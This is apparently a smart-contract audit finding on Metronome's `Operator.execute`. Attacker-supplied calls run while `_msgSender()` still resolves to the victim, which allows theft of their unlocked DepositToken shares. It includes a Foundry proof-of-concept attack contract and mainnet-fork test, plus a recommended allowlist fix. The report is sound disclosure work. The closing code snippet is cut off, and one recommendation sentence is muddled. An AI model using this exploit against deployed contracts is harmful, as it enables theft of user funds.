### Title
Malicious `Operator.execute` payload can impersonate the caller to steal unlocked DepositToken shares and act on their positions - (File: contracts/Operator.sol)

### Summary
`Operator.execute` stores the outer `msg.sender` in transient storage and then performs arbitrary calls with arbitrary calldata. Any contract called inside `execute` can call back into Metronome contracts (`DepositToken.transfer`, `Pool` functions, etc.) while `SynthContext._msgSender()` still resolves to the victim. Analogous to CVE-2022-22756 (a benign-looking object becomes an executable payload), a user convinced to run a crafted `execute` bundle — e.g., via a malicious frontend promising a swap or claim — silently authorizes protocol actions as themselves, enabling theft of their unlocked collateral shares and manipulation of their positions.

### Finding Description
In `contracts/Operator.sol`, `execute` sets `MSG_SENDER_STORAGE` to `msg.sender` for the duration of the call, then performs `target.functionCallWithValue(callData, value)` on arbitrary attacker-supplied targets [1](#0-0) . `SynthContext._msgSender()` returns `operator.getActualMsgSender()` whenever `msg.sender == operator`, so every protocol modifier and accounting check treats nested calls as coming from the victim [2](#0-1) .

The `nonReentrant` guard is `ReentrancyGuardTransient` **on the Operator contract only** — it blocks re-entering `execute`/`getActualMsgSender`-authenticated paths back through Operator, but does not block an arbitrary target contract from calling `DepositToken.transfer`, `Pool.deposit`/`withdraw`, `Pool.swap`, or `SmartFarmingManager` while the transient sender is still the victim. The attacker deploys a contract whose fallback/entry function performs:

```solidity
depositToken.transfer(attacker, depositToken.unlockedBalanceOf(victim));
```

Because `_msgSender()` == victim, balance checks, `onlyIfCan*` style authorization, and accounting all pass with the victim's identity.

### Impact Explanation
Direct theft of user funds: all unlocked `DepositToken` shares of any user who executes a crafted bundle can be transferred to the attacker. The attacker can also take protocol actions as the victim — swapping, depositing/withdrawinig into attacker-favorable conditions, or leveraging positions — because every identity check resolves to the victim. This is the exact analog of the Firefox bug: a user performs an apparently benign action (running a multicall bundle) that turns into arbitrary privileged actions under their identity.

### Likelihood Explanation
Requires phishing a user into calling `Operator.execute` with attacker-constructed calldata — the same social-engineering precondition as the source CVE (user interaction required, CVSS UI:R). Once the victim calls it, the exploit is deterministic and atomic. The deployed `Operator` is registered in `PoolRegistry` (deployments for mainnet, base, optimism, plasma, hemi, swell exist), so `SynthContext` impersonation works on the production configuration. No governance or privileged role is needed by the attacker.

### Recommendation
Restrict `execute` targets to an allowlisted set of protocol contracts and explicitly enumerated selectors (e.g., only Pool/gateway entry points), rather than arbitrary `target.call(callData)`. Alternatively, clear `MSG_SENDER_STORAGE` before each sub-call and re-set it only around calls to allowlisted protocol contracts, or have protocol contracts reject `getActualMsgSender` when `tx.origin != getActualMsgSender()` is not feasible — the cleaner fix is a target allowlist enforced in `Operator.execute`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";
import {DepositToken} from "../contracts/DepositToken.sol";

contract MaliciousTarget {
    function pwn(address depositToken, address victim, address attacker) external {
        uint256 bal = DepositToken(depositToken).unlockedBalanceOf(victim);
        DepositToken(depositToken).transfer(attacker, bal); // _msgSender() == victim
    }
}

contract OperatorPhishTest is Test {
    function testStealShares() public {
        // fork mainnet; use deployed Operator, PoolRegistry, a live DepositToken, and a holder V
        IOperator operator = IOperator(OPERATOR_ADDR);
        DepositToken dt = DepositToken(DEPOSIT_TOKEN_ADDR);
        address victim = VICTIM; // holds unlocked shares
        address attacker = address(this);
        MaliciousTarget mal = new MaliciousTarget();

        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(mal),
            value: 0,
            callData: abi.encodeCall(MaliciousTarget.pwn, (address(dt), victim, attacker))
        });

        vm.prank(victim); // victim tricked into running the bundle
        operator.execute(calls);

        assertEq(dt.balanceOf(victim), 0);
        assertGt(dt.balanceOf(attacker), 0);
    }
}
```

    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

    }
